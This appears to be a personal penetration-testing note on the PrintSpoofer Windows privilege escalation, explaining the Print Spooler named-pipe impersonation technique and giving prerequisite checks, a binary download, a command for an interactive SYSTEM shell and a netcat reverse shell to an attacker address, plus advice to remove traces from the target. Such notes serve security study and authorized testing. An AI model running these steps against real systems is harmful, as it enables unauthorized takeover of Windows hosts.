---
created: 2026-07-21
updated: 2026-10-01
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---

## PrintSpoofer

> [!abstract]+ **Scope**: Local Windows privilege escalation using the PrintSpoofer exploit; system requirements and execution sequence on Windows 8.1 through Windows 11 and Windows Server 2012 through Windows Server 2022.

- [ ] Confirm `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` via `whoami /priv`.
- [ ] Confirm the Print Spooler service (`spoolsv.exe`) is running via `sc.exe query spooler`.
- [ ] Download or transfer the correct architecture binary (`PrintSpoofer32.exe` or `PrintSpoofer64.exe`).
- [ ] Execute `PrintSpoofer` to trigger named pipe connection and token impersonation.
- [ ] Verify `NT AUTHORITY\SYSTEM` execution context.

---

## How PrintSpoofer works

- PrintSpoofer abuses the Windows Print Spooler service (`spoolsv.exe`) and named pipe impersonation to escalate from service accounts holding `SeImpersonatePrivilege` to `NT AUTHORITY\SYSTEM`.
- The exploit operates across three execution phases:

  1. **Creating a custom named pipe listener**: PrintSpoofer creates a local named pipe endpoint with a path structure such as `\\.\pipe\foo\pipe\spoolss`. The security descriptor grants access to `Everyone`.
  2. **Coercing Print Spooler authentication**: PrintSpoofer invokes `RpcRemoteFindFirstPrinterChangeNotificationEx()` over the MS-RPRN RPC interface. It requests notification traffic sent to a custom target path containing a forward slash (`/`):
    - Provided client target path: `\\HOSTNAME/pipe/foo`
    - Spooler normalized path: `\\HOSTNAME\pipe\foo\pipe\spoolss`
    - Path validation passes because of the forward slash, but **Windows normalizes the path into a local pipe controlled by the exploit**. The Print Spooler service (`spoolsv.exe`), running under `NT AUTHORITY\SYSTEM`, connects to the pipe.
  3. **Impersonating client context and spawning processes**: PrintSpoofer calls `ImpersonateNamedPipeClient()` to obtain a `SYSTEM` impersonation token. It then calls `DuplicateTokenEx()` to generate a primary token and launches the specified command via `CreateProcessWithTokenW()` or `CreateProcessAsUserW()`.

> [!note] See [[🛠️ Named pipes]] for details on named pipe impersonation. See [[Access tokens and impersonation]] for token duplication details.

## Gathering prerequisite information

- Check assigned user privileges:

```powershell
whoami /priv
```

- Query the Print Spooler service status via PowerShell:

```powershell
Get-Service Spooler
```

- Query the Print Spooler service status via Service Control Manager:

```cmd
sc.exe query spooler
```

- It should be `RUNNING`.
## Local privilege escalation via PrintSpoofer

- Download `PrintSpoofer64.exe` on your attacking machine:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

- Transfer the file to the target.
- Spawn an interactive command shell as `SYSTEM`:

```powershell
PrintSpoofer64.exe -i -c cmd.exe
```

- Execute a reverse shell command:

```powershell
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe"
```

| Option | Description |
| :--- | :--- |
| `-i` | Interactive mode; attaches an interactive console session to the spawned process. |
| `-c` | Command String; specifies the command binary executed as `NT AUTHORITY\SYSTEM`. |
| `-d` | Desktop Target; specifies the target desktop window station (default: current desktop). |

## Troubleshooting

- `RPC server unavailable` (`0x6ba`)
  - The Print Spooler service (`spoolsv.exe`) is disabled or stopped; start the service via `sc.exe start spooler` (or use [[GodPotato]] / [[RoguePotato]] that don't rely on Print Spooler).
- `SecurityIdentification` token returned
  - Current thread context lacks `SeImpersonatePrivilege`; confirm the required privilege (`whoami /priv`) before executing the exploit.
- `CreateProcessWithTokenW` error
  - Pipe listener path conflicts with an existing named pipe or the security descriptor is rejected; try a different pipe name or test with an alternative account token.

> [!tip]+ Verification and cleanup
> - Remove `PrintSpoofer64.exe` and temporary payload binaries from the target host after completing execution.

## References and further reading

- [`PrintSpoofer — GitHub (itm4n)`](https://github.com/itm4n/PrintSpoofer)
- [`PrintSpoofer — Abusing Impersonation Privileges on Windows 10 and Server 2019 — itm4n's blog`](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [`SpoolSample — GitHub (leechristensen)`](https://github.com/leechristensen/SpoolSample)
- [`MS-RPRN: Print System Remote Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)
- [`Windows Privilege Escalation — Potatoes — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
